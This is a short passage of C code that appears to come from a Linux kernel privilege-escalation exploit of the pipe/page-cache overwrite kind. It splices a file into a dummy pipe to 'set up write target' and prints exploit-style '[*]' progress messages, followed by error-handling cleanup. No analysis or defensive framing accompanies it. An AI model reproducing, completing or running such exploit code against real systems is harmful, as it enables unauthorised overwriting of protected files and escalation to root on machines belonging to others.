    printf("[*] Second splice (file to dummy pipe) to set up write target...\n");
    if (splice(fd, &page_aligned_offset, dummy_pipe[1], NULL, PAGE_SIZE, 0) < 0) {
        perror("splice from file to dummy pipe");
        close(fd);
        close(p[0]);
        close(dummy_pipe[0]);
        close(dummy_pipe[1]);
